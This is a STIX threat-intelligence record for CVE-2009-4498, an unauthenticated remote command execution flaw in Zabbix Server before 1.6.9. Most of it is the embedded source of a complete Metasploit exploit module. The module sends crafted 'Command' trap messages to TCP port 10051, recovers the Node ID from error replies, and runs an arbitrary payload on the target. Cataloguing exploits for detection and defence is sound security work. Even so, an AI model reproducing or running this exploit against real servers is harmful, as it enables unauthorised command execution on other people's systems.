{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d8557cc3-792a-4a4d-ace6-54b10af820f5",
    "created": "2024-08-14T16:57:13.244214Z",
    "modified": "2024-08-14T16:57:13.244218Z",
    "name": "Zabbix Server Arbitrary Command Execution",
    "description": " This module abuses the \"Command\" trap in Zabbix Server to execute arbitrary commands without authentication. By default the Node ID \"0\" is used, if it doesn't work, the Node ID is leaked from the error message and exploitation retried.  According to the vendor versions prior to 1.6.9 are vulnerable. The vulnerability has been successfully tested on Zabbix Server 1.6.7 on Ubuntu 10.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/zabbix_server_exec.rb",
            "external_id": "zabbix_server_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4498"
        },
        {
            "source_name": "reference",
            "url": "https://support.zabbix.com/browse/ZBX-1030"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zabbix Server Arbitrary Command Execution',\n      'Description'    => %q{\n          This module abuses the \"Command\" trap in Zabbix Server to execute arbitrary\n        commands without authentication. By default the Node ID \"0\" is used, if it doesn't\n        work, the Node ID is leaked from the error message and exploitation retried.\n\n        According to the vendor versions prior to 1.6.9 are vulnerable. The vulnerability\n        has been successfully tested on Zabbix Server 1.6.7 on Ubuntu 10.04.\n      },\n      'Author'         =>\n        [\n          'Nicob <nicob[at]nicob.net>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-4498' ],\n          [ 'OSVDB', '60965' ],\n          [ 'BID', '37989' ],\n          [ 'EDB', '10432' ],\n          [ 'URL', 'https://support.zabbix.com/browse/ZBX-1030' ]\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet',\n              # *_perl, *_python and *_ruby work if they are installed\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Zabbix 1.6.7', { } ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate'  => 'Sep 10 2009'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(10051),\n      ])\n  end\n\n  def send_command(sock, node_id, cmd)\n    host_id = Rex::Text.rand_text_numeric(3)\n    msg = \"Command\\255\"\n    msg << \"#{node_id}\\255\"\n    msg << \"#{host_id}\\255\"\n    msg << \"#{cmd}\\n\"\n    sock.put(msg)\n    res = sock.get_once\n    return res\n  end\n\n  def check\n    peer = \"#{rhost}:#{rport}\"\n    node_id = 0\n    clue = Rex::Text.rand_text_alpha(rand(5)+5)\n    cmd = \"echo #{clue}\"\n\n    connect\n    vprint_status(\"Sending 'Command' request...\")\n    res = send_command(sock, node_id, cmd)\n    disconnect\n\n    if res\n      vprint_status(res)\n      if res =~ /#{clue}/\n        return Exploit::CheckCode::Vulnerable\n      elsif res =~ /-1/ and res=~ /NODE (\\d*)/\n        node_id = $1\n        vprint_good(\"Node ID #{node_id} discovered\")\n      else\n        return Exploit::CheckCode::Safe\n      end\n    else # No response\n      return Exploit::CheckCode::Safe\n    end\n\n    # Retry with the good node_id\n    connect\n    vprint_status(\"Sending 'Command' request with discovered Node ID...\")\n    res = send_command(sock, node_id, cmd)\n    disconnect\n    if res and res =~ /#{clue}/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n    node_id = 0\n    cmd = payload.encoded\n\n    connect\n    print_status(\"Sending 'Command' request...\")\n    res = send_command(sock, node_id, cmd)\n    disconnect\n\n    if res and res =~ /-1/ and res=~ /NODE (\\d*)/\n      # Retry with the good node_id\n      node_id = $1\n      print_good(\"Node ID #{node_id} discovered\")\n      connect\n      print_status(\"Sending 'Command' request with discovered Node ID...\")\n      res = send_command(sock, node_id, cmd)\n      disconnect\n    end\n\n    # Read command output from socket if cmd/unix/generic payload was used\n    if (datastore['CMD'])\n      if res and res =~ /\\x30\\xad/\n        print_good(\"Command executed successfully\")\n        print_status(\"Output:\\n#{res.split(\"\\x30\\xad\").last}\")\n      else\n        print_error(\"Failed to execute the command\")\n      end\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "Sep 10 2009",
    "x_mitre_platforms": [
        "['unix']"
    ]
}